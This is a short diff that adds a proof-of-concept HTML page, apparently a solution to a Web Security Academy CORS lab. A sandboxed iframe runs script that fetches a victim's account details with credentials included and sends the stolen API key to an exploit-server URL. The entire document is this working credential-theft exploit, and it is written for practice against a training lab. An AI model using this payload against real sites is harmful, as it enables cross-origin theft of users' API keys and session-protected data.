@@ -1,0 +1,19 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
+    const vulnerable_url = 'https://LAB-ID.web-security-academy.net/accountDetails';
+    const malicious_url = 'https://exploit-EXPLOIT-LAB-ID.exploit-server.net';
+
+    try {
+        (async () => {
+            const options = {
+                credentials: 'include'
+            }
+
+            const response = await fetch(vulnerable_url, options);
+            const { apikey } = await response.json();
+
+            fetch(`${malicious_url}/log?data=${apikey}`);
+        })();
+    } catch (err) {
+        fetch(`${malicious_url}/log?data=${err}`);
+    }
+&lt;/script&gt;"></iframe>
